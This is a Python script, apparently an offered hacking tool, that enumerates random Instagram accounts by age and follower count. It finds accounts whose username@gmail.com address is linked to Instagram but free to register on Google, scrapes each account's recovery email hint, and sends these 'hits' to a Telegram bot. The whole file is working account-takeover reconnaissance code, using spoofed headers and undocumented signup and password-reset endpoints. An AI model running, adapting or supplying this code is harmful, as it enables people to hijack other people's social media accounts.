import sys
import os
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

# ========== ONLY WHITE UI ==========
W = '\033[97m'      # White
R = '\033[0m'       # Reset

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
from datetime import datetime
import hashlib

EXP = datetime(2027, 9, 14, 16, 0)


# ========== LICENSE KEY ==========
LICENSE_KEY = "ALLEN GOD"

# ========== AGE RANGES ==========
AGE_RANGES = {
    1: (1, 1279000),
    2: (1279001, 17750000),
    3: (17750001, 279760000),
    4: (279760001, 900990000),
    5: (900990001, 1629010000),
    6: (1629010001, 2500000000),
    7: (2500000001, 3713668786),
    8: (3713668787, 5699785217),
    9: (5699785218, 8507940634),
    10: (8507940635, 21254029834),
    11: (21254029835, 40000000000)
}

# ========== LICENSE BANNER ==========
def show_license_banner():
    print()

# ========== LICENSE VERIFICATION ==========
def verify_license():
    clear()
    show_license_banner()
    print()
    print(f"  LICENSE KEY  ▸  ", end="")
    key = input().strip().upper()
    
    if key == LICENSE_KEY:
        print(f"\n  ✅ LICENSE VERIFIED! WELCOME TO ANKUR WORLD")
        time.sleep(1)
        return True
    else:
        print(f"\n  ✘ INVALID LICENSE KEY! ACCESS DENIED.")
        time.sleep(2)
        return False
        # ========== STATS DISPLAY ==========
class StatsDisplay:
    def __init__(self):
        self.hits = 0
        self.bad_ig = 0
        self.bad_mail = 0
        self.total = 0
        self.rate = 0
        self.lock = threading.Lock()
        self.running = True
        threading.Thread(target=self._animate, daemon=True).start()

    def _animate(self):
        sys.stdout.write("\033[?25l")
        while self.running:
            with self.lock:
                if self.total > 0:
                    self.rate = (self.hits / self.total) * 100
                
                stats = f"""
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}
{W}  HITS      : {self.hits}{R}
{W}  BAD IG    : {self.bad_ig}{R}
{W}  BAD MAIL  : {self.bad_mail}{R}
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}
@ALLEN"""
            sys.stdout.write(f"\r{stats}\033[K")
            sys.stdout.flush()
            time.sleep(0.5)
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()

# ========== GOOGLE CHECKER ==========
class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers,
                    timeout=15
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params,
                    headers=headers,
                    data=data,
                    timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except:
            time.sleep(3)
            try:
                with open('tl.txt', 'r') as f:
                    line = f.read().strip()
                    tl, host = line.split('//')
            except:
                return 'bad'

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )

        try:
            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=10
            )
            if '"gf.uar",1' in response.text:
                return 'good'
            elif '"er",null,null,null,null,400' in response.text:
                time.sleep(1)
                return self.check_availability(email)
            else:
                return 'bad'
        except:
            return 'bad'
            # ========== INSTAGRAM CHECKER ==========
class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def check_email(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ waterfall +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            return f"{email}" in resp.text
        except:
            return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

def resolve_creation_year(uid):
    try:
        n = int(uid)
        for limit, yr in [
            (1279000, '2010'), (17750000, '2011'), (279760000, '2012'),
            (900990000, '2013'), (1629010000, '2014'), (2500000000, '2015'),
            (3713668786, '2016'), (5699785217, '2017'), (8507940634, '2018'),
            (21254029834, '2019')
        ]:
            if n < limit:
                return yr
        return '2020-2023'
    except:
        return ''

def recover_account_email(username):
    for _ in range(2):
        try:
            s = requests.Session()
            s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            try:
                s.get('https://www.instagram.com/accounts/password/reset/?source=fxcal', timeout=10)
            except:
                pass
            csrf = s.cookies.get('csrftoken') or 'H1CoCux1VkR2aRz7WQsv8lGE95UVqIbM'
            h = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/password/reset/?source=fxcal',
                'user-agent': 'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15',
                'x-csrftoken': csrf,
                'x-ig-app-id': '936619743392459',
                'x-requested-with': 'XMLHttpRequest'
            }
            r = s.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=h, data={'email_or_username': username, 'flow': 'fxcal', 'jazoest': '22680'}, timeout=12)
            if r.status_code == 429:
                time.sleep(1)
                continue
            if r.status_code != 200:
                continue
            data = r.json()
            raw_text = json.dumps(data, ensure_ascii=False).lower()
            if 'email bulunamad' in raw_text or 'no user found' in raw_text:
                return '-'
            for k in ('obfuscated_email', 'email', 'contact_point', 'message'):
                val = data.get(k) if isinstance(data, dict) else None
                if val and isinstance(val, str):
                    m = re.search(r'[\w.*]+\@[\w.*]+\.\w+', val)
                    if m:
                        return m.group(0)
            if isinstance(data, dict):
                for val in data.values():
                    if isinstance(val, str) and '@' in val:
                        m = re.search(r'[\w.*]+\@[\w.*]+\.\w+', val)
                        if m:
                            return m.group(0)
            m = re.search(r'[\w.*]+\@[\w.*]+\.\w+', json.dumps(data, ensure_ascii=False))
            return m.group(0) if m else '-'
        except:
            time.sleep(1)
    return '-'
    # ========== SEND HIT ==========
def send_hit(token, chat_id, stats, user, email, name, flw, flg, posts, rec, prv, yr, bio, pk):
    with stats.lock:
        stats.hits += 1
    
    # Check if recovery email was found, if not show as empty
    if rec and rec != '-' and '@' in rec and '.' in rec:
        rec_disp = rec
    else:
        rec_disp = ''
    
    bio_disp = bio if bio else 'NO BIO'
    
    # Format the message exactly as requested
    msg = f"""ᴛᴏᴏʟ ʙʏ - @BlameAllen
━━━━━━━━━━━━━━━━━━
🪪  Id   {pk}
👤 𝐀𝐜𝐜𝐨𝐮𝐧𝐭     @{user}
📧 𝐄𝐦𝐚𝐢𝐥       {email}

📊 𝐒𝐭𝐚𝐭𝐬
• 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬    {flw}
• 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠    {flg}
• 𝐁𝐢𝐨    {bio_disp}

• 𝐂𝐫𝐞𝐚𝐭𝐞𝐝      {yr}

🌐 𝐏𝐫𝐨𝐟𝐢𝐥𝐞     instagram.com/{user}
━━━━━━━━━━━━━━━━━━
@Allen """
    
    # Add channel and group buttons at the end
    footer = f"""
📢 ALLEN
"""
    
    # Full message with buttons
    full_msg = msg + footer
    
    try:
        with open('mayuda_hits.txt', 'a', encoding='utf-8') as f:
            f.write(full_msg + '\n\n')
    except:
        pass

    if token and chat_id:
        try:
            # Send as text with inline keyboard for buttons
            inline_keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "📢 OWNER", "url": "https://t.me/BlameALLEN"},
                        
                    ]
                ]
            }
            
            payload = {
                'chat_id': chat_id,
                'text': msg,
                'parse_mode': 'HTML',
                'reply_markup': json.dumps(inline_keyboard)
            }
            
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data=payload,
                timeout=8
            )
        except:
            pass

# ========== WORKER ==========
def process_user(token, chat_id, stats, google, insta, r_start, r_end, min_flw):
    while stats.running:
        try:
            user_id = random.randint(r_start, r_end)
            user_data = insta.get_user_data(user_id)
            if not user_data:
                time.sleep(random.uniform(0.3, 0.8))
                continue

            username = user_data.get('username')
            if not username:
                continue

            email = f"{username}@gmail.com"

            if insta.check_email(email):
                if google.check_availability(email) == 'good':
                    followers = user_data.get('follower_count') or 0
                    if min_flw > 0 and followers < min_flw:
                        continue

                    full_name = user_data.get('full_name', '')
                    following = user_data.get('following_count') or 0
                    posts = user_data.get('media_count') or 0
                    is_private = user_data.get('is_private', False)
                    pk = user_data.get('pk', '')
                    bio = user_data.get('biography', '')

                    rec = recover_account_email(username)
                    if rec == '?':
                        rec = recover_account_email(email)
                    if rec in ('-', '?'):
                        rec = ''

                    yr = resolve_creation_year(pk) if pk else ''

                    send_hit(token, chat_id, stats, username, email, full_name, followers, following, posts, rec, is_private, yr, bio, pk)
                else:
                    with stats.lock:
                        stats.bad_mail += 1
            else:
                with stats.lock:
                    stats.bad_ig += 1
            
            with stats.lock:
                stats.total += 1

            time.sleep(random.uniform(0.4, 1.0))

        except Exception as e:
            time.sleep(random.uniform(0.6, 1.2))

# ========== MAIN ==========
def main():
    # License Check
    if not verify_license():
        sys.exit(1)
    
    clear()
    
    print()
    token = input(f'  BOT TOKEN  ▸  ').strip()
    chat_id = input(f'   ID    ▸  ').strip()

    if token and chat_id:
        print(f'\n  CONNECTING...')
        try:
            tr = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=10)
            if tr.status_code == 200 and tr.json().get('ok'):
                print(f"  ✅ BOT: @{tr.json()['result'].get('username', 'bot')}")
            else:
                print(f'  ✘ INVALID BOT TOKEN')
        except Exception as e:
            print(f'  ✘ TELEGRAM ERROR: {e}')
    else:
        print(f'\n  ⚠️ NO BOT TOKEN PROVIDED. HITS WILL BE SAVED LOCALLY ONLY.')
    print()

    print(f"""
{W}━━━━━━━━━━━━━━━━━━━━━━━━
        
        HIT SELECTOR 
        
{W}━━━━━━━━━━━━━━━━━━━━━━━━
        [1] 2010        [2] 2011
        [3] 2012        [4] 2013
        [5] 2014        [6] 2015
        [7] 2016        [8] 2017
        [9] 2018        [10] 2019
        [11] 2020-2023
{W}━━━━━━━━━━━━━━━━━━━━━━━━{R}
        """)
    
    try:
        age_choice = input(f"  CHOOSE (1-11) ▸ ")
        age = int(age_choice)
        r_start, r_end = AGE_RANGES[age]
    except:
        r_start, r_end = (2500000001, 21254029834)

    print(f"\n{W}━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{W}  MIN FOLLOWERS : {R}", end="")
    while True:
        try:
            min_flw = int(input())
            break
        except:
            print(f"{W}  MIN FOLLOWERS : {R}", end="")

    clear()
    
    stats = StatsDisplay()
    google = GoogleChecker()
    insta = InstagramChecker()

    with ThreadPoolExecutor(max_workers=80) as executor:
        for _ in range(80):
            executor.submit(process_user, token, chat_id, stats, google, insta, r_start, r_end, min_flw)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stats.running = False
            print(f"\n{W}✦ SESSION ENDED ✦{R}")

if __name__ == "__main__":
    main()